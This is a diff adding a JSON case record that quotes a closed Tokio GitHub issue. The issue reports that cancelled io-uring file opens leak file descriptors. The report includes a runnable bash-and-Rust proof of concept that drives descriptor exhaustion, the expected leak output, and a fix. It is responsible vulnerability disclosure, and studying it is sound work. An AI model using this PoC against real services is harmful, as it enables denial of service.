@@ -1,0 +1,49 @@
+{
+  "case_id": "tokio-rs-tokio-7983",
+  "refs": [
+    {
+      "detail": {
+        "body": "We received the below report from Mufeed VH of Winfunc Research. Thank you @mufeedvh for reporting this! I've determined that this bug does not need to be handled under embargo, so I am posting it publicly on our bug tracker.\n\n---\n\n## Summary\nAn attacker who can trigger and cancel Tokio `io-uring` file opens in a Linux deployment can leak process file descriptors, leading to file-descriptor exhaustion and denial of service.\n\n## Severity\nLOW\n\nCVSS v3.1: `AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L` (3.7)\n\n## Root Cause\nTokio's Linux `io-uring` filesystem path creates an `OpenAt` operation that only adopts the returned file descriptor if `Open::complete` runs. When the future is dropped after first poll, Tokio switches the operation lifecycle to `Cancelled`, but later completion handling discards the CQE result instead of adopting or closing a successful fd.\n\nRelevant code:\n\n- [`tokio/src/fs/open_options.rs#L520-L541`](https://github.com/tokio-rs/tokio/blob/ee04abe7970b769439e2fecd4b1dd8790e4234e1/tokio/src/fs/open_options.rs#L520-L541)\n- [`tokio/src/io/uring/open.rs#L20-L25`](https://github.com/tokio-rs/tokio/blob/ee04abe7970b769439e2fecd4b1dd8790e4234e1/tokio/src/io/uring/open.rs#L20-L25)\n- [`tokio/src/runtime/driver/op.rs#L77-L91`](https://github.com/tokio-rs/tokio/blob/ee04abe7970b769439e2fecd4b1dd8790e4234e1/tokio/src/runtime/driver/op.rs#L77-L91)\n- [`tokio/src/runtime/io/driver/uring.rs#L75-L84`](https://github.com/tokio-rs/tokio/blob/ee04abe7970b769439e2fecd4b1dd8790e4234e1/tokio/src/runtime/io/driver/uring.rs#L75-L84)\n- [`tokio/src/runtime/io/driver/uring.rs#L259-L279`](https://github.com/tokio-rs/tokio/blob/ee04abe7970b769439e2fecd4b1dd8790e4234e1/tokio/src/runtime/io/driver/uring.rs#L259-L279)\n\n## Proof of Exploitability\n1. `OpenOptions::open()` enters the Linux `io-uring` branch and submits `Op::open(path, opts)?.await` when `io-uring` is enabled and supported: [`tokio/src/fs/open_options.rs#L520-L541`](https://github.com/tokio-rs/tokio/blob/ee04abe7970b769439e2fecd4b1dd8790e4234e1/tokio/src/fs/open_options.rs#L520-L541).\n2. `Open::complete()` is the only place that turns a successful CQE result into an owned `File` via `File::from_raw_fd(fd as i32)`: [`tokio/src/io/uring/open.rs#L20-L25`](https://github.com/tokio-rs/tokio/blob/ee04abe7970b769439e2fecd4b1dd8790e4234e1/tokio/src/io/uring/open.rs#L20-L25).\n3. Dropping a polled `Op<Open>` calls `cancel_op(index, data)`, which stores `Lifecycle::Cancelled(cancel_data)` but does not submit a kernel cancel or install any fd cleanup: [`tokio/src/runtime/driver/op.rs#L77-L91`](https://github.com/tokio-rs/tokio/blob/ee04abe7970b769439e2fecd4b1dd8790e4234e1/tokio/src/runtime/driver/op.rs#L77-L91), [`tokio/src/runtime/io/driver/uring.rs#L259-L279`](https://github.com/tokio-rs/tokio/blob/ee04abe7970b769439e2fecd4b1dd8790e4234e1/tokio/src/runtime/io/driver/uring.rs#L259-L279).\n4. When the kernel later completes the open, `dispatch_completions()` sees `Lifecycle::Cancelled(_)` and removes the slab entry, explicitly discarding the CQE result: [`tokio/src/runtime/io/driver/uring.rs#L75-L84`](https://github.com/tokio-rs/tokio/blob/ee04abe7970b769439e2fecd4b1dd8790e4234e1/tokio/src/runtime/io/driver/uring.rs#L75-L84).\n5. The attached runnable PoC executes that path 128 times in a Linux container and shows `/proc/self/fd` growing from `7` to `136`, proving leaked file descriptors in the same process.\n\n## Preconditions\n- Linux deployment where `io_uring` syscalls are permitted.\n- Tokio built with `--cfg tokio_unstable` and the `fs`, `rt`, and `io-uring` features enabled.\n- Application code uses Tokio's `OpenOptions::open()` on attacker-triggerable paths and can drop the future or owning task after the first poll.\n- The runtime takes the `io-uring` path rather than falling back to the blocking-thread implementation.\n\n## Runnable PoC\n```bash\n#!/usr/bin/env bash\nset -euo pipefail\n\nREPO_ROOT=\"$(pwd)\"\nTMPDIR=\"$(mktemp -d)\"\ntrap 'rm -rf \"$TMPDIR\"' EXIT\n\nmkdir -p \"$TMPDIR/src\"\n\ncat > \"$TMPDIR/Cargo.toml\" <<TOML\n[package]\nname = \"io_uring_fd_leak_poc\"\nversion = \"0.1.0\"\nedition = \"2021\"\n\n[workspace]\n\n[dependencies]\ntokio = { path = \"$REPO_ROOT/tokio\", features = [\"fs\", \"rt\", \"rt-multi-thread\", \"time\", \"io-uring\", \"sync\"] }\nTOML\n\ncat > \"$TMPDIR/src/main.rs\" <<'RS'\nuse std::fs;\nuse std::future::{poll_fn, Future};\nuse std::path::PathBuf;\nuse std::task::Poll;\nuse std::time::Duration;\n\nfn fd_count() -> usize {\n    fs::read_dir(\"/proc/self/fd\").unwrap().count()\n}\n\nasync fn cancel_open(path: PathBuf) {\n    let (tx, mut rx) = tokio::sync::mpsc::unbounded_channel();\n\n    let handle = tokio::spawn(async move {\n        poll_fn(|cx| {\n            let mut opt = tokio::fs::OpenOptions::new();\n            opt.read(true);\n            let fut = opt.open(&path);\n            let mut fut = Box::pin(fut);\n            let poll = fut.as_mut().poll(cx);\n            assert!(matches!(poll, Poll::Pending), \"open did not use io_uring path\");\n            tx.send(()).unwrap();\n            Poll::<()>::Pending\n        })\n        .await;\n    });\n\n    rx.recv().await.unwrap();\n    handle.abort();\n    let err = handle.await.unwrap_err();\n    assert!(err.is_cancelled(), \"task did not cancel as expected\");\n}\n\nfn main() {\n    let rt = tokio::runtime::Builder::new_multi_thread()\n        .worker_threads(1)\n        .enable_all()\n        .build()\n        .unwrap();\n\n    rt.block_on(async {\n        let path = PathBuf::from(\"/etc/hosts\");\n        let before = fd_count();\n\n        for _ in 0..128 {\n            cancel_open(path.clone()).await;\n        }\n\n        tokio::time::sleep(Duration::from_millis(250)).await;\n\n        let after = fd_count();\n        let leaked = after.saturating_sub(before);\n\n        println!(\"before={before}\");\n        println!(\"after={after}\");\n        println!(\"leaked={leaked}\");\n\n        assert!(leaked >= 64, \"expected many leaked fds, saw {leaked}\");\n    });\n}\nRS\n\ndocker run --rm \\\n  --security-opt seccomp=unconfined \\\n  -e RUSTFLAGS=\"--cfg tokio_unstable\" \\\n  -v \"$REPO_ROOT\":\"$REPO_ROOT\" \\\n  -v \"$TMPDIR\":\"$TMPDIR\" \\\n  -w \"$TMPDIR\" \\\n  rust:1.85-bookworm \\\n  cargo run --quiet\n```\n\n## Expected Result\nThe script should complete successfully and print output similar to:\n\n```text\nbefore=7\nafter=136\nleaked=129\n```\n\n`leaked` should be a large positive number. In the verified run for this audit, the fd count increased by `129`.\n\n## Impact\nThis is an availability issue. Each successful canceled `OpenAt` leaks one live `O_CLOEXEC` descriptor inside the Tokio process. Repeated attacker-triggerable cancellations can exhaust `RLIMIT_NOFILE`, after which the process will fail additional file opens and may also fail unrelated socket or pipe creation.\n\nThe proven impact is bounded to descriptor exhaustion. I did not observe confidentiality or integrity impact from the leaked descriptors.\n\n## Remediation\nEnsure canceled `OpenAt` completions are explicitly cleaned up instead of discarded.\n\nBefore:\n\n```rust\nSome(Lifecycle::Cancelled(_)) => {\n    ops.remove(idx);\n}\n```\n\nAfter:\n\n```rust\nSome(Lifecycle::Cancelled(cancel_data)) => {\n    if let CancelData::Open(_) = cancel_data {\n        let result = CqeResult::from(cqe).result;\n        if let Ok(fd) = result {\n            unsafe { libc::close(fd as i32) };\n        }\n    }\n    ops.remove(idx);\n}\n```\n\nThe underlying principle is ownership preservation on canceled operations: if completion of a canceled request can create a resource, Tokio must either adopt that resource into an RAII owner or close it immediately.\n\n## Verification After Fix\n1. Re-run the PoC above in the same Linux containerized environment.\n2. Confirm the program no longer reports a large positive `leaked` count.\n3. A correct fix should keep `after` close to `before` and must not satisfy the PoC's current `assert!(leaked >= 64)`.\n4. Add a regression test alongside [`tokio/tests/fs_uring.rs#L113-L145`](https://github.com/tokio-rs/tokio/blob/ee04abe7970b769439e2fecd4b1dd8790e4234e1/tokio/tests/fs_uring.rs#L113-L145) that cancels many polled opens and asserts descriptor count stability.",
+        "closedAt": "2026-04-08T05:37:20Z",
+        "comments": [],
+        "createdAt": "2026-03-20T08:08:18Z",
+        "labels": [
+          {
+            "color": "f5f1fd",
+            "description": "Category: This is a bug.",
+            "id": "MDU6TGFiZWw0Mzk4OTcxODg=",
+            "name": "C-bug"
+          },
+          {
+            "color": "f7e101",
+            "description": "Area: The main tokio crate",
+            "id": "MDU6TGFiZWwxOTkzNTAxMjg2",
+            "name": "A-tokio"
+          },
+          {
+            "color": "f7b101",
+            "description": "Module: tokio/fs",
+            "id": "MDU6TGFiZWwxOTkzNTA3Nzgz",
+            "name": "M-fs"
+          },
+          {
+            "color": "bfd4f2",
+            "description": "Topic: Linux io_uring",
+            "id": "LA_kwDOBAsbdc8AAAACTlO-Ug",
+            "name": "T-io-uring"
+          }
+        ],
+        "number": 7979,
+        "state": "CLOSED",
+        "title": "Cancelled io-uring open futures leak fds",
+        "url": "https://github.com/tokio-rs/tokio/issues/7979"
+      },
+      "target": {
+        "number": 7979,
+        "reason": "io_uring open cancellation fd leak report.",
+        "repo": "tokio-rs/tokio",
+        "type": "issue"
+      }
+    }
+  ]
+}
